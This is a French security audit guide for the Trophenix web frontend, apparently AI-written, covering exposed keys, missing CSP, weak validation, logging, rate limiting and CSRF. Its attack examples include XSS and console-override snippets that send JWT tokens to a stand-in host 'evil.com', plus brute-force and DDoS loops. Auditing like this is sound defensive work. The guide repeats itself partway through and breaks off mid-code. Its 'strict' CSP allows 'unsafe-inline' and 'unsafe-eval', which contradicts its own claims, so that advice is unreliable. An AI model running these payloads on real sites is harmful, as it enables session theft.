# 🔐 Guide de Sécurité - Trophenix Frontend

## 📝 Historique du document

| Date       | Version | Lignes | Modifications                                                      | Auteur |
| ---------- | ------- | ------ | ------------------------------------------------------------------ | ------ |
| 2025-01-11 | 1.0     | 913    | Création audit sécurité complet (vulnérabilités + recommandations) | Claude |

---

## 📌 Vue d'ensemble

Ce document analyse les vulnérabilités potentielles du frontend et fournit des recommandations pour se défendre contre des attaques de pentesters expérimentés.

**Statut actuel** : ⚠️ PLUSIEURS VULNÉRABILITÉS CRITIQUES IDENTIFIÉES

---

## 🚨 Vulnérabilités critiques identifiées

### 1. ❌ CRITIQUE : Clés API exposées dans le code source

**Localisation** : `.env` commité ou bundle JavaScript

**Problème** :
```bash
# Dans dist/assets/index-BkUuEXfK.js (bundle production)
VITE_SUPABASE_URL=https://ufitfifaimndezqmczgd.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Vecteur d'attaque** :
```bash
# Un attaquant peut extraire les clés depuis le bundle
curl https://trophenix.com/assets/index-*.js | grep SUPABASE

# Puis utiliser l'API directement
curl -X POST https://ufitfifaimndezqmczgd.supabase.co/rest/v1/profiles \
  -H "apikey: eyJhbGc..." \
  -H "Authorization: Bearer eyJhbGc..." \
  -d '{"evil": "payload"}'
```

**Impact** : 🔴 CRITIQUE
- Accès direct à la base de données
- Bypass potentiel de l'UI
- Création de comptes malveillants
- Extraction de données

**Solution** :
```typescript
// ✅ 1. Les clés ANON sont normales pour Supabase (protégées par RLS)
// Mais JAMAIS de service_role_key côté frontend

// ✅ 2. Vérifier que RLS est TOUJOURS activé
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;

// ✅ 3. Logs et monitoring
// Détecter les appels API suspects (volume, patterns anormaux)

// ✅ 4. Rate limiting côté Supabase
// Configurer dans Supabase Dashboard → Settings → API
```

---

### 2. ❌ CRITIQUE : Pas de Content Security Policy (CSP)

**Problème** : `index.html` n'a AUCUNE protection CSP

**Vecteur d'attaque - XSS** :
```javascript
// Si un attaquant injecte du code (via input non sanitisé)
<script>
  // Vol du JWT token
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: localStorage.getItem('supabase.auth.token')
  });
</script>
```

**Impact** : 🔴 CRITIQUE
- Vol de sessions utilisateurs
- Exécution de code malveillant
- Redirection vers sites de phishing
- Keylogging

**Solution** :

```html
<!-- index.html -->
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />

    <!-- ✅ AJOUTER CSP STRICT -->
    <meta http-equiv="Content-Security-Policy" content="
      default-src 'self';
      script-src 'self' 'unsafe-inline' 'unsafe-eval';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https: blob:;
      font-src 'self' data:;
      connect-src 'self' https://*.supabase.co https://api.trophenix.com;
      frame-ancestors 'none';
      base-uri 'self';
      form-action 'self';
    ">

    <!-- ✅ Protection XSS -->
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    <meta name="referrer" content="strict-origin-when-cross-origin">

    <!-- ✅ Permissions Policy -->
    <meta http-equiv="Permissions-Policy" content="
      geolocation=(),
      microphone=(),
      camera=(),
      payment=()
    ">

    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Trophenix Athlete Career Transition</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
```

---

### 3. ⚠️ HAUTE : Validation côté client uniquement

**Localisation** : `src/utils/validation.ts`

**Problème** :
```typescript
// ❌ Validation faible
export function isValidEmail(email: string): boolean {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

export function isValidPassword(password: string): boolean {
  return password.length >= 8; // TROP FAIBLE
}
```

**Vecteur d'attaque** :
```javascript
// Attaquant bypass la validation dans la console browser
const { supabase } = await import('./lib/supabase.js');

// Création d'un compte avec mot de passe faible
await supabase.auth.signUp({
  email: 'attacker@evil.com',
  password: '123' // Bypass validation frontend
});

// Injection SQL-like dans les champs
await supabase.from('profiles').insert({
  email: "admin'--",
  user_type: 'admin' // Tentative d'escalade de privilèges
});
```

**Impact** : 🟠 HAUTE
- Comptes avec mots de passe faibles
- Injection de données malformées
- Bypass des règles métier

**Solution** :

```typescript
// ✅ validation.ts RENFORCÉE
export function isValidEmail(email: string): boolean {
  // Regex RFC 5322 compliant
  const emailRegex = /^[a-zA-Z0-9.!#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;

  if (!emailRegex.test(email)) return false;
  if (email.length > 254) return false; // RFC max length

  // Blacklist emails jetables
  const disposableProviders = ['tempmail.com', 'guerrillamail.com', '10minutemail.com'];
  const domain = email.split('@')[1];
  if (disposableProviders.includes(domain)) return false;

  return true;
}

export function isValidPassword(password: string): boolean {
  if (password.length < 12) return false; // Minimum 12 caractères

  // Doit contenir au moins :
  const hasUpperCase = /[A-Z]/.test(password);
  const hasLowerCase = /[a-z]/.test(password);
  const hasNumbers = /\d/.test(password);
  const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);

  if (!hasUpperCase || !hasLowerCase || !hasNumbers || !hasSpecialChar) {
    return false;
  }

  // Vérifier contre les mots de passe communs
  const commonPasswords = [
    'password123', 'admin123', 'qwerty123', '12345678',
    'password', 'welcome123', 'Password1!', 'Aa123456!'
  ];

  if (commonPasswords.includes(password)) return false;

  return true;
}

// ✅ Sanitization des inputs
export function sanitizeInput(input: string): string {
  return input
    .trim()
    .replace(/[<>]/g, '') // Enlever < et >
    .replace(/javascript:/gi, '') // Enlever javascript:
    .replace(/on\w+=/gi, ''); // Enlever les event handlers (onclick=, etc.)
}

// ✅ Validation de l'URL
export function isValidURL(url: string): boolean {
  try {
    const parsed = new URL(url);
    // Seulement HTTPS en production
    if (import.meta.env.PROD && parsed.protocol !== 'https:') {
      return false;
    }
    return true;
  } catch {
    return false;
  }
}
```

**ET validation côté backend Django** :

```python
# backend/validators.py
from django.core.validators import validate_email
from django.core.exceptions import ValidationError
import re

def validate_strong_password(password):
    """Validation robuste du mot de passe"""
    if len(password) < 12:
        raise ValidationError("Le mot de passe doit contenir au moins 12 caractères")

    if not re.search(r'[A-Z]', password):
        raise ValidationError("Le mot de passe doit contenir au moins une majuscule")

    if not re.search(r'[a-z]', password):
        raise ValidationError("Le mot de passe doit contenir au moins une minuscule")

    if not re.search(r'\d', password):
        raise ValidationError("Le mot de passe doit contenir au moins un chiffre")

    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        raise ValidationError("Le mot de passe doit contenir au moins un caractère spécial")

    # Liste des mots de passe communs
    common = ['password123', 'admin123', 'qwerty123']
    if password.lower() in common:
        raise ValidationError("Ce mot de passe est trop commun")
```

---

### 4. ⚠️ HAUTE : Logs exposant des données sensibles

**Localisation** : Multiples fichiers avec `console.log()`

**Problème** :
```typescript
// src/services/authService.ts:162
console.error('Erreur lors de la récupération de l\'utilisateur:', error);

// src/components/Auth/SignUpFlow.tsx
console.log('SignUp result:', data); // Peut contenir email, JWT, etc.
```

**Vecteur d'attaque** :
```javascript
// Dans la console du browser, un attaquant peut :
// 1. Voir tous les logs (emails, erreurs, tokens temporaires)
// 2. Overrider console.log pour capturer les données
const originalLog = console.log;
console.log = function(...args) {
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(args)
  });
  originalLog.apply(console, args);
};
```

**Impact** : 🟠 HAUTE
- Fuite d'informations sensibles
- Aide au reconnaissance pour les attaquants
- Exposition de la structure de données

**Solution** :

```typescript
// ✅ src/utils/logger.ts
const isDevelopment = import.meta.env.DEV;
const isProduction = import.meta.env.PROD;

export const logger = {
  debug: (...args: any[]) => {
    if (isDevelopment) {
      console.debug('[DEBUG]', ...args);
    }
  },

  info: (...args: any[]) => {
    if (isDevelopment) {
      console.info('[INFO]', ...args);
    }
  },

  error: (message: string, error?: Error) => {
    if (isDevelopment) {
      console.error('[ERROR]', message, error);
    }

    // En production : envoyer à un service de monitoring (Sentry, etc.)
    if (isProduction) {
      // sendToErrorTracking(message, error);
    }
  },

  // JAMAIS loguer les données sensibles
  sanitize: (data: any) => {
    const sensitive = ['password', 'token', 'apikey', 'secret', 'jwt'];
    const sanitized = { ...data };

    Object.keys(sanitized).forEach(key => {
      if (sensitive.some(s => key.toLowerCase().includes(s))) {
        sanitized[key] = '[REDACTED]';
      }
    });

    return sanitized;
  }
};

// ✅ Utilisation
import { logger } from '@/utils/logger';

const result = await supabase.auth.signUp({ email, password });
logger.debug('SignUp result:', logger.sanitize(result));
```

---

### 5. ⚠️ MOYENNE : Pas de Rate Limiting côté frontend

**Problème** : Rien n'empêche un attaquant de spammer les endpoints

**Vecteur d'attaque** :
```javascript
// Brute force login
for (let i = 0; i < 10000; i++) {
  await fetch('https://ufitfifaimndezqmczgd.supabase.co/auth/v1/token', {
    method: 'POST',
    body: JSON.stringify({
      email: 'victim@example.com',
      password: passwords[i]
    })
  });
}

// DDoS l'API
while(true) {
  fetch('/api/athletes');
}
```

**Impact** : 🟡 MOYENNE
- Brute force des comptes
- DDoS de l'application
- Coûts d'infrastructure élevés

**Solution** :

```typescript
// ✅ src/utils/rateLimiter.ts
class RateLimiter {
  private attempts: Map<string, number[]> = new Map();

  canMakeRequest(key: string, maxAttempts: number = 5, windowMs: number = 60000): boolean {
    const now = Date.now();
    const userAttempts = this.attempts.get(key) || [];

    // Filtrer les tentatives dans la fenêtre de temps
    const recentAttempts = userAttempts.filter(time => now - time < windowMs);

    if (recentAttempts.length >= maxAttempts) {
      return false;
    }

    // Ajouter la tentative actuelle
    recentAttempts.push(now);
    this.attempts.set(key, recentAttempts);

    return true;
  }

  reset(key: string) {
    this.attempts.delete(key);
  }
}

export const rateLimiter = new RateLimiter();

// ✅ Utilisation dans authService.ts
static async signIn(email: string, password: string): Promise<AuthResult> {
  const rateLimitKey = `login_${email}`;

  if (!rateLimiter.canMakeRequest(rateLimitKey, 5, 300000)) {
    return {
      success: false,
      error: 'Trop de tentatives. Réessayez dans 5 minutes.'
    };
  }

  try {
    const { data, error } = await supabase.auth.signInWithPassword({
      email,
      password,
    });

    if (error) {
      return { success: false, error: error.message };
    }

    // Reset le rate limit en cas de succès
    rateLimiter.reset(rateLimitKey);

    return { success: true, data };
  } catch (error: any) {
    return { success: false, error: error.message };
  }
}
```

---

### 6. ⚠️ MOYENNE : Pas de protection CSRF

**Problème** : Pas de CSRF tokens

**Vecteur d'attaque** :
```html
<!-- Site malveilleux evil.com -->
<html>
<body>
  <script>
    // L'utilisateur est connecté à Trophenix
    // evil.com peut faire des requêtes en son nom
    fetch('https://trophenix.com/api/profile', {
      method: 'DELETE',
      credentials: 'include' // Inclut les cookies de session
    });
  </script>
</body>
</html>
```

**Impact** : 🟡 MOYENNE
- Actions non autorisées au nom de l'utilisateur
- Modification/suppression de données
- Création de comptes

**Solution** :

```typescript
// ✅ src/utils/csrf.ts
export const csrfToken = {
  generate(): string {
    return crypto.randomUUID();
  },

  store(token: string) {
    sessionStorage.setItem('csrf_token', token);
  },

  get(): string | null {
    return sessionStorage.getItem('csrf_token');
  },

  validate(token: string): boolean {
    return token === this.get();
  }
};

// ✅ Intercepteur pour toutes les requêtes
import { supabase } from './lib/supabase';

// Ajouter le CSRF token à toutes les requêtes
const originalRequest = supabase.http.request;
supabase.http.request = function(options) {
  const token = csrfToken.get();
  if (token) {
    options.headers = {
      ...options.headers,
      'X-CSRF-Token': token
    };
  }
  return originalRequest.call(this, options);
};
```

**ET côté backend** :

```python
# backend/middleware.py
from django.middleware.csrf import CsrfViewMiddleware

class CustomCSRFMiddleware(CsrfViewMiddleware):
    def process_view(self, request, callback, callback_args, callback_kwargs):
        # Vérifier le token CSRF dans le header
        if request.method in ('POST', 'PUT', 'DELETE', 'PATCH'):
            token = request.META.get('HTTP_X_CSRF_TOKEN')
            if not token or not self._compare_tokens(token, request.COOKIES.get('csrftoken')):
                return JsonResponse({'error': 'CSRF token missing or invalid'}, status=403)
        return super().process_view(request, callback, callback_args, callback_kwargs)
```

---

### 7. ⚠️ BASSE : Pas de Subresource Integrity (SRI)

**Problème** : CDN compromis pourrait injecter du code malveillant

**Vecteur d'attaque** :
```html
<!-- Si vous utilisez des CDN externes -->
<script src="https://cdn.example.com/library.js"></script>
<!-- Si le CDN est hacké, code malveilleux exécuté -->
```

**Impact** : 🟢 BASSE (pas de CDN externe actuellement)

**Solution** :
```html
<!-- ✅ Si vous ajoutez des CDN, toujours avec SRI -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous"
></script>
```

---

### 8. ⚠️ BASSE : Pas de monitoring/alerting

**Problème** : Aucune détection des attaques en temps réel

**Impact** : 🟢 BASSE (mais critique pour détecter les attaques)

**Solution** :

```typescript
// ✅ src/utils/monitoring.ts
interface SecurityEvent {
  type: 'failed_login' | 'suspicious_activity' | 'rate_limit_exceeded' | 'xss_attempt';
  details: any;
  timestamp: number;
  userAgent: string;
  ip?: string;
}

class SecurityMonitor {
  private events: SecurityEvent[] = [];

  log(type: SecurityEvent['type'], details: any) {
    const event: SecurityEvent = {
      type,
      details,
      timestamp: Date.now(),
      userAgent: navigator.userAgent
    };

    this.events.push(event);

    // Envoyer à un service de monitoring (Sentry, LogRocket, etc.)
    if (import.meta.env.PROD) {
      this.sendToMonitoring(event);
    }

    // Alerter si trop d'événements suspects
    if (this.events.length > 10) {
      this.triggerAlert();
    }
  }

  private sendToMonitoring(event: SecurityEvent) {
    // Intégration avec Sentry, DataDog, etc.
    fetch('/api/security-events', {
      method: 'POST',
      body: JSON.stringify(event)
    });
  }

  private triggerAlert() {
    console.error('🚨 SECURITY ALERT: Multiple suspicious activities detected');
    // Notifier l'équipe de sécurité
  }
}

export const securityMonitor = new SecurityMonitor();

// ✅ Utilisation
import { securityMonitor } from '@/utils/monitoring';

// Après un échec de connexion
if (loginError) {
  securityMonitor.log('failed_login', { email, error: loginError });
}

// Détection de tentative XSS
if (input.includes('<script>')) {
  securityMonitor.log('xss_attempt', { input });
}
```

---

## 🛡️ Configuration Vite sécurisée

```typescript
// ✅ vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],

  // ✅ Build sécurisé
  build: {
    sourcemap: false, // Ne pas exposer le code source
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true, // Supprimer tous les console.log en prod
        drop_debugger: true,
      },
    },
    rollupOptions: {
      output: {
        // Obfuscation des noms de fichiers
        entryFileNames: 'assets/[name]-[hash].js',
        chunkFileNames: 'assets/[name]-[hash].js',
        assetFileNames: 'assets/[name]-[hash].[ext]',
      },
    },
  },

  // ✅ Headers de sécurité
  server: {
    headers: {
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'X-XSS-Protection': '1; mode=block',
      'Referrer-Policy': 'strict-origin-when-cross-origin',
    },
  },

  optimizeDeps: {
    exclude: ['lucide-react'],
  },
});
```

---

## 🔐 Checklist de sécurité complète

### Avant le déploiement

- [ ] **CSP** : Content Security Policy configurée dans `index.html`
- [ ] **Headers de sécurité** : X-Frame-Options, X-Content-Type-Options, etc.
- [ ] **RLS Supabase** : TOUTES les tables ont RLS activé
- [ ] **Validation forte** : Mot de passe minimum 12 caractères avec complexité
- [ ] **Sanitization** : Tous les inputs utilisateurs sont sanitisés
- [ ] **Rate limiting** : Frontend ET backend
- [ ] **CSRF protection** : Tokens CSRF sur toutes les mutations
- [ ] **Logs sécurisés** : Pas de données sensibles dans les logs production
- [ ] **Monitoring** : Alertes configurées pour activités suspectes
- [ ] **Dependencies** : `npm audit` sans vulnérabilités HIGH/CRITICAL
- [ ] **Sourcemaps** : Désactivés en production
- [ ] **console.log** : Supprimés en production
- [ ] **HTTPS** : SEULEMENT HTTPS en production (pas de HTTP)
- [ ] **SRI** : Subresource Integrity pour tout CDN externe

### Tests de pénétration

```bash
# ✅ Commandes pour tester votre sécurité

# 1. Scan des vulnérabilités npm
npm audit

# 2. Tester les headers de sécurité
curl -I https://trophenix.com

# 3. Tester CSP
# Ouvrir la console browser et essayer :
eval('alert("XSS")'); // Doit être bloqué par CSP

# 4. Tester RLS Supabase
# Essayer d'accéder aux données d'un autre user

# 5. Brute force protection
# Essayer 10+ connexions échouées rapidement
```

---

## 🎯 Scénarios d'attaque et défenses

### Scénario 1 : XSS (Cross-Site Scripting)

**Attaque** :
```javascript
// Attaquant injecte dans un champ de commentaire
<img src=x onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('token'))">
```

**Défense** :
```typescript
// ✅ Sanitization stricte
import DOMPurify from 'dompurify';

const cleanInput = DOMPurify.sanitize(userInput);

// ✅ CSP bloque l'exécution de scripts inline
// ✅ Utiliser textContent au lieu de innerHTML
element.textContent = userInput; // Pas d'exécution de HTML
```

### Scénario 2 : SQL Injection (via Supabase)

**Attaque** :
```javascript
// Tentative d'injection
const email = "admin'--";
await supabase.from('profiles').select('*').eq('email', email);
```

**Défense** :
```sql
-- ✅ Supabase utilise des prepared statements (protégé)
-- ✅ RLS empêche l'accès non autorisé
-- ✅ Validation stricte des inputs côté frontend ET backend
```

### Scénario 3 : Session Hijacking

**Attaque** :
```javascript
// Vol du JWT token via XSS
const token = localStorage.getItem('supabase.auth.token');
fetch('https://evil.com/steal', { method: 'POST', body: token });
```

**Défense** :
```typescript
// ✅ CSP empêche XSS
// ✅ HttpOnly cookies (Supabase utilise localStorage, mais avec refresh tokens courts)
// ✅ JWT expiration courte (1h par défaut)
// ✅ Refresh token rotation
```

### Scénario 4 : Account Takeover

**Attaque** :
```javascript
// Brute force du mot de passe
for (const pwd of commonPasswords) {
  await supabase.auth.signInWithPassword({ email: 'victim@example.com', password: pwd });
}
```

**Défense** :
```typescript
// ✅ Rate limiting (5 tentatives / 5 minutes)
// ✅ Mot de passe fort obligatoire (12+ caractères, complexité)
// ✅ Blocage temporaire après X tentatives échouées
// ✅ Email d'alerte après tentatives suspectes
// ✅ 2FA (à implémenter)
```

### Scénario 5 : Data Exfiltration

**Attaque** :
```javascript
// Extraction massive de données
const allProfiles = await supabase.from('profiles').select('*');
const allAthletes = await supabase.from('athlete_profiles').select('*');
// Envoyer vers un serveur externe
```

**Défense** :
```sql
-- ✅ RLS empêche la lecture de données non autorisées
CREATE POLICY "Users can only read own profile"
  ON profiles FOR SELECT
  USING (auth.uid() = id);

-- ✅ Rate limiting sur les requêtes
-- ✅ Monitoring des requêtes suspectes (volume anormal)
-- ✅ Pagination obligatoire (pas de select * sans limite)
```

---

## 🚀 Plan d'action prioritaire

### Phase 1 : URGENT (à faire immédiatement)

1. **Ajouter CSP dans index.html** ← 30 minutes
2. **Activer RLS sur TOUTES les tables Supabase** ← 1 heure
3. **Renforcer validation des mots de passe** ← 1 heure
4. **Configurer Vite pour build sécurisé** ← 30 minutes
5. **Supprimer les console.log en production** ← 30 minutes

**Temps total : ~4 heures**

### Phase 2 : IMPORTANT (cette semaine)

6. **Implémenter rate limiting frontend** ← 2 heures
7. **Ajouter sanitization des inputs** ← 2 heures
8. **Configurer monitoring/alerting** ← 3 heures
9. **Tests de pénétration basiques** ← 4 heures

**Temps total : ~11 heures**

### Phase 3 : RECOMMANDÉ (ce mois)

10. **CSRF protection** ← 3 heures
11. **2FA (authentification à deux facteurs)** ← 8 heures
12. **Audit de sécurité professionnel** ← Budget externe
13. **Tests de pénétration avancés** ← Budget externe

**Temps total : ~11 heures + budget externe**

---

## 📊 Score de sécurité actuel

| Catégorie            | Score | Commentaire                                      |
| -------------------- | ----- | ------------------------------------------------ |
| **Authentification** | 6/10  | Supabase OK, mais mots de passe faibles acceptés |
| **Autorisation**     | 8/10  | RLS activé, mais à vérifier partout              |
| **Validation**       | 4/10  | Validation côté client uniquement, trop faible   |
| **Logging**          | 3/10  | Logs exposent des données sensibles              |
| **Headers sécurité** | 2/10  | Aucun header de sécurité configuré               |
| **Monitoring**       | 1/10  | Aucun monitoring des attaques                    |
| **Rate limiting**    | 2/10  | Seulement côté Supabase (basique)                |
| **CSRF**             | 0/10  | Aucune protection CSRF                           |
| **XSS**              | 3/10  | Pas de CSP, sanitization minimale                |
| **Dependencies**     | 7/10  | Peu de dépendances, mais non auditées            |

**Score global : 3.6/10** ⚠️

**Après Phase 1 : 6.5/10** ✅
**Après Phase 2 : 8.0/10** 🎯
**Après Phase 3 : 9.5/10** 🔒

---

## 🔗 Ressources

### Documentation

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Supabase Security Best Practices](https://supabase.com/docs/guides/auth/auth-deep-dive/auth-row-level-security)
- [CSP MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

### Outils

- `npm audit` - Scanner les vulnérabilités
- [Snyk](https://snyk.io/) - Scan continu des dépendances
- [Observatory](https://observatory.mozilla.org/) - Test headers de sécurité
- [OWASP ZAP](https://www.zaproxy.org/) - Tests de pénétration

---

## ✅ Résumé

| Vulnérabilité           | Criticité  | Temps de fix | Priorité |
| ----------------------- | ---------- | ------------ | -------- |
| Pas de CSP              | 🔴 CRITIQUE | 30 min       | 1        |
| RLS non vérifié partout | 🔴 CRITIQUE | 1h           | 2        |
| Validation faible       | 🟠 HAUTE    | 1h           | 3        |
| Logs sensibles          | 🟠 HAUTE    | 30 min       | 4        |
| Pas de rate limiting    | 🟡 MOYENNE  | 2h           | 5        |
| Pas de CSRF             | 🟡 MOYENNE  | 3h           | 6        |
| Pas de monitoring       | 🟢 BASSE    | 3h           | 7        |

**Le frontend actuel est VULNÉRABLE à plusieurs attaques critiques.**

**Action immédiate requise pour la Phase 1 avant tout test de pénétration.**

---

**Prêt pour l'audit de sécurité après implémentation de ce guide !** 🛡️


# 🔐 Guide de Sécurité - Trophenix Frontend

## 📝 Historique du document

| Date       | Version | Lignes | Modifications                                                      | Auteur |
| ---------- | ------- | ------ | ------------------------------------------------------------------ | ------ |
| 2025-01-11 | 1.0     | 913    | Création audit sécurité complet (vulnérabilités + recommandations) | Claude |

---

## 📌 Vue d'ensemble

Ce document analyse les vulnérabilités potentielles du frontend et fournit des recommandations pour se défendre contre des attaques de pentesters expérimentés.

**Statut actuel** : ⚠️ PLUSIEURS VULNÉRABILITÉS CRITIQUES IDENTIFIÉES

---

## 🚨 Vulnérabilités critiques identifiées

### 1. ❌ CRITIQUE : Clés API exposées dans le code source

**Localisation** : `.env` commité ou bundle JavaScript

**Problème** :
```bash
# Dans dist/assets/index-BkUuEXfK.js (bundle production)
VITE_SUPABASE_URL=https://ufitfifaimndezqmczgd.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Vecteur d'attaque** :
```bash
# Un attaquant peut extraire les clés depuis le bundle
curl https://trophenix.com/assets/index-*.js | grep SUPABASE

# Puis utiliser l'API directement
curl -X POST https://ufitfifaimndezqmczgd.supabase.co/rest/v1/profiles \
  -H "apikey: eyJhbGc..." \
  -H "Authorization: Bearer eyJhbGc..." \
  -d '{"evil": "payload"}'
```

**Impact** : 🔴 CRITIQUE
- Accès direct à la base de données
- Bypass potentiel de l'UI
- Création de comptes malveillants
- Extraction de données

**Solution** :
```typescript
// ✅ 1. Les clés ANON sont normales pour Supabase (protégées par RLS)
// Mais JAMAIS de service_role_key côté frontend

// ✅ 2. Vérifier que RLS est TOUJOURS activé
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;

// ✅ 3. Logs et monitoring
// Détecter les appels API suspects (volume, patterns anormaux)

// ✅ 4. Rate limiting côté Supabase
// Configurer dans Supabase Dashboard → Settings → API
```

---

### 2. ❌ CRITIQUE : Pas de Content Security Policy (CSP)

**Problème** : `index.html` n'a AUCUNE protection CSP

**Vecteur d'attaque - XSS** :
```javascript
// Si un attaquant injecte du code (via input non sanitisé)
<script>
  // Vol du JWT token
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: localStorage.getItem('supabase.auth.token')
  });
</script>
```

**Impact** : 🔴 CRITIQUE
- Vol de sessions utilisateurs
- Exécution de code malveillant
- Redirection vers sites de phishing
- Keylogging

**Solution** :

```html
<!-- index.html -->
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />

    <!-- ✅ AJOUTER CSP STRICT -->
    <meta http-equiv="Content-Security-Policy" content="
      default-src 'self';
      script-src 'self' 'unsafe-inline' 'unsafe-eval';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https: blob:;
      font-src 'self' data:;
      connect-src 'self' https://*.supabase.co https://api.trophenix.com;
      frame-ancestors 'none';
      base-uri 'self';
      form-action 'self';
    ">

    <!-- ✅ Protection XSS -->
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    <meta name="referrer" content="strict-origin-when-cross-origin">

    <!-- ✅ Permissions Policy -->
    <meta http-equiv="Permissions-Policy" content="
      geolocation=(),
      microphone=(),
      camera=(),
      payment=()
    ">

    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Trophenix Athlete Career Transition</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
```

---

### 3. ⚠️ HAUTE : Validation côté client uniquement

**Localisation** : `src/utils/validation.ts`

**Problème** :
```typescript
// ❌ Validation faible
export function isValidEmail(email: string): boolean {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

export function isValidPassword(password: string): boolean {
  return password.length >= 8; // TROP FAIBLE
}
```

**Vecteur d'attaque** :
```javascript
// Attaquant bypass la validation dans la console browser
const { supabase } = await import('./lib/supabase.js');

// Création d'un compte avec mot de passe faible
await supabase.auth.signUp({
  email: 'attacker@evil.com',
  password: '123' // Bypass validation frontend
});

// Injection SQL-like dans les champs
await supabase.from('profiles').insert({
  email: "admin'--",
  user_type: 'admin' // Tentative d'escalade de privilèges
});
```

**Impact** : 🟠 HAUTE
- Comptes avec mots de passe faibles
- Injection de données malformées
- Bypass des règles métier

**Solution** :

```typescript
// ✅ validation.ts RENFORCÉE
export function isValidEmail(email: string): boolean {
  // Regex RFC 5322 compliant
  const emailRegex = /^[a-zA-Z0-9.!#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;

  if (!emailRegex.test(email)) return false;
  if (email.length > 254) return false; // RFC max length

  // Blacklist emails jetables
  const disposableProviders = ['tempmail.com', 'guerrillamail.com', '10minutemail.com'];
  const domain = email.split('@')[1];
  if (disposableProviders.includes(domain)) return false;

  return true;
}

export function isValidPassword(password: string): boolean {
  if (password.length < 12) return false; // Minimum 12 caractères

  // Doit contenir au moins :
  const hasUpperCase = /[A-Z]/.test(password);
  const hasLowerCase = /[a-z]/.test(password);
  const hasNumbers = /\d/.test(password);
  const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);

  if (!hasUpperCase || !hasLowerCase || !hasNumbers || !hasSpecialChar) {
    return false;
  }

  // Vérifier contre les mots de passe communs
  const commonPasswords = [
    'password123', 'admin123', 'qwerty123', '12345678',
    'password', 'welcome123', 'Password1!', 'Aa123456!'
  ];

  if (commonPasswords.includes(password)) return false;

  return true;
}

// ✅ Sanitization des inputs
export function sanitizeInput(input: string): string {
  return input
    .trim()
    .replace(/[<>]/g, '') // Enlever < et >
    .replace(/javascript:/gi, '') // Enlever javascript:
    .replace(/on\w+=/gi, ''); // Enlever les event handlers (onclick=, etc.)
}

// ✅ Validation de l'URL
export function isValidURL(url: string): boolean {
  try {
    const parsed = new URL(url);
    // Seulement HTTPS en production
    if (import.meta.env.PROD && parsed.protocol !== 'https:') {
      return false;
    }
    return true;
  } catch {
    return false;
  }
}
```

**ET validation côté backend Django** :

```python
# backend/validators.py
from django.core.validators import validate_email
from django.core.exceptions import ValidationError
import re

def validate_strong_password(password):
    """Validation robuste du mot de passe"""
    if len(password) < 12:
        raise ValidationError("Le mot de passe doit contenir au moins 12 caractères")

    if not re.search(r'[A-Z]', password):
        raise ValidationError("Le mot de passe doit contenir au moins une majuscule")

    if not re.search(r'[a-z]', password):
        raise ValidationError("Le mot de passe doit contenir au moins une minuscule")

    if not re.search(r'\d', password):
        raise ValidationError("Le mot de passe doit contenir au moins un chiffre")

    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        raise ValidationError("Le mot de passe doit contenir au moins un caractère spécial")

    # Liste des mots de passe communs
    common = ['password123', 'admin123', 'qwerty123']
    if password.lower() in common:
        raise ValidationError("Ce mot de passe est trop commun")
```

---

### 4. ⚠️ HAUTE : Logs exposant des données sensibles

**Localisation** : Multiples fichiers avec `console.log()`

**Problème** :
```typescript
// src/services/authService.ts:162
console.error('Erreur lors de la récupération de l\'utilisateur:', error);

// src/components/Auth/SignUpFlow.tsx
console.log('SignUp result:', data); // Peut contenir email, JWT, etc.
```

**Vecteur d'attaque** :
```javascript
// Dans la console du browser, un attaquant peut :
